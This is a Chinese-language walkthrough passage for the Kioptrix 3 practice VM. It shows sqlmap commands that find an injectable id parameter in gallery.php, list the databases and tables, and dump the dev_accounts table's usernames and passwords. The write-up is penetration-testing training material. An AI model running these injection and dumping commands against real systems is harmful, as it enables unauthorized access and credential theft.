## 方法二：sql注入

查看官方提示

![](../Images/3e543785b37d49444d5aaff82d512192.png)

按照提示，编辑/etc/hosts

将目标IP指向图库域名

192.168.160.131 kioptrix3.com

浏览器访问，然后我点击了`now`超链接并被重定向到图库页面。

![](../Images/2c92caec2d052ff29f3fb0f2688a233d.png)

尝试sql注入，启动sqlmap,跑了半天无结果

![](../Images/d1fac428a540876b4f0e2c290ef4b5bf.png)

单击home，尝试sqlmap，依然无结果，再次探测其他的超链接子页面

![](../Images/9f68b153a235145d3a5c4ed1ab6893e8.png)

进到`Ligoat Press Room`，依旧没啥反应，但是这里发现了个调节选项，这里我选择了Photo id(看到id就蠢蠢欲动)

再次使用sqlmap

```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos"

```

![](../Images/f5ee8bee06fa26f6e2d4f7c7062b847b.png)

这一次，sqlmap确定id参数可能是可注入的，并且后端数据库似乎是MySQL。

继续确定存在的数据库

```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos"
 -dbs
```

![](../Images/d6889e371e51a9639cc88f36e45ec4e8.png)

查看gallery数据库下的表

```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos"
 -D gallery --tables
```

![](../Images/a065f74e485e4db0d4a7aa497ac60752.png)

查看表中的数据

```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos"
 -D gallery -T dev_accounts --dump
```

![](../Images/f16b9e7d1d28b52daaf8f24545be83d3.png)

成功获取用户名和密码，后面的提权步骤和上面的一样，就不再赘述

至此，靶机渗透结束。
